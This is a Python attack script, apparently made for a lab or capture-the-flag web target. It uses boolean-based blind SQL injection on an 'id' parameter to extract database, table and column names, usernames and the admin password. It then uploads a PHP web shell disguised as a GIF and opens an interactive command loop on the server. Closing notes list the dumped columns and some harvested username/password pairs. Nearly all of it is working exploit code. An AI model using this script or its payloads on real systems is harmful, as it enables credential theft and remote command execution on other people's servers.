import requests
from bs4 import BeautifulSoup
import re
import time
from colorama import Fore,Style

remote_address = input("Enter the target website IP Address : ")

#a to z and 0 to 9 and some special characters
atz = "abcdefghijklmnopqrstuvwxyz1234567890._-!".lower()

#the target website url
url = f"http://{remote_address}/"


def search_db_name():
    db_name = ""

    for j in range(15):
        for i in atz:
            res = requests.get(f"{url}?id=15' or substr(database(),{j},1) = '{i}' -- -")

            soup = str(BeautifulSoup(res.content, "html.parser"))

            reSearch = re.search("You are on the way.....", soup)

            if reSearch:
                db_name += i
                print(db_name)
            else:
                continue   
    return db_name



def search_tb_name():
    tb_name = ""


    for j in range(15):
        for i in atz:
            res = requests.get(f"{url}?id=15' || substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),{j},1) = '{i}' -- -")

            soup = str(BeautifulSoup(res.content, "html.parser"))

            reSearch = re.search("You are on the way.....", soup)

            if reSearch:
                tb_name += i
                print(tb_name)
            else:
                continue 
    return tb_name



def search_column_name():
    col_name = ""

    for j in range(15):
        for i in atz:
            res = requests.get(f"{url}?id=15' or substr((select column_name from information_schema.columns where table_schema=database() limit 11,1),{j},1) = '{i}' -- -")

            soup = str(BeautifulSoup(res.content, "html.parser"))

            reSearch = re.search("You are on the way.....", soup)

            if reSearch:
                col_name += i
                print(col_name)
            else:
                continue
    return col_name



def search_username():
    username = ""

    for j in range(15):
        for i in atz:
            res = requests.get(f"{url}?id=15' or substr((select username from users limit 7,1),{j},1) = '{i}'; -- -")

            soup = str(BeautifulSoup(res.content, "html.parser"))

            reSearch = re.search("You are on the way.....", soup)

            if reSearch:
                username += i
                print(username)
            else:
                continue
    return username



def search_password():
    password = ""

    for j in range(15):
        for i in atz:
            res = requests.get(f"{url}?id=15' or substr((select password from users where username='admin'),{j},1) = '{i}'; -- -")

            soup = str(BeautifulSoup(res.content, "html.parser"))

            reSearch = re.search("You are on the way.....", soup)

            if reSearch:
                password += i
                print(password)
            else:
                continue
    
    return password


#upload the GIF file
def file_upload():

    rurl = f"{url}bkr.php"

    req = requests.Session()

    #get request to the main page to get cookie
    req.get(f"{url}aijqy.php")


    header = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language" : "en-US,en;q=0.5",
        "Accept-Encoding" : "gzip, deflate",
        "Content-Type" : "multipart/form-data; boundary=---------------------------33532551339340547022169488129",
        
    }

    data = """-----------------------------33532551339340547022169488129\r\nContent-Disposition: form-data; name="uploadedFile"; filename="1kb-min.php"\r\nContent-Type: image/gif\r\n\r\nGIF89a\r\n<!DOCTYPE html><body><div><pre class="command"><?php  system($_GET['cmd']); ?></pre></div></body></html>\r\n-----------------------------33532551339340547022169488129\r\nContent-Disposition: form-data; name="uploadBtn"\r\n\r\n\r\n-----------------------------33532551339340547022169488129--"""


    #upload the file
    res = req.post(rurl,data=data,headers=header)
    
    file_name = re.findall(r'[a-z0-9A-Z]*\.php',res.text)[0]

    #file name and session
    return file_name, req


#the file_upload returns two values
file_name,req = file_upload()



def get_shell(file_name, req, input_command):

    res = req.get(f"{url}uploads/{file_name}?cmd={input_command}")
    soup = BeautifulSoup(res.text, "html.parser")
    print(soup.find("pre", class_="command").text)



if __name__ == "__main__":

    # print(f"Database Name : {search_db_name()}")
    print(f"Table Name : {search_tb_name()}")
    # print(f"Column Name : {search_column_name()}")
    print(f"Username From  Users Table : {search_username()}")
    print(f"Admin's Password : {Fore.RED}{search_password()}")
    print(Style.RESET_ALL)

    print("\n--Please Wait, Trying to Get Shell--\n")
    time.sleep(3)


    while(True):
        input_command = input("# ")
        get_shell(file_name,req, input_command)





#notes
"""

Column Names ---

email_id - 1
id - 2
referer - 3
ip_address - 4
id - 5
uagent - 6
ipaddress - 7
username - 8
id -9
username - 10
password - 11


Table Names ---

users - 3


From users Table ----

dump - 
angelina - 
dummy - 
secure
stupid 	
superman - geniou
batman
admin - aijqy.php
admin1 - admin1
admin2 - admin2

"""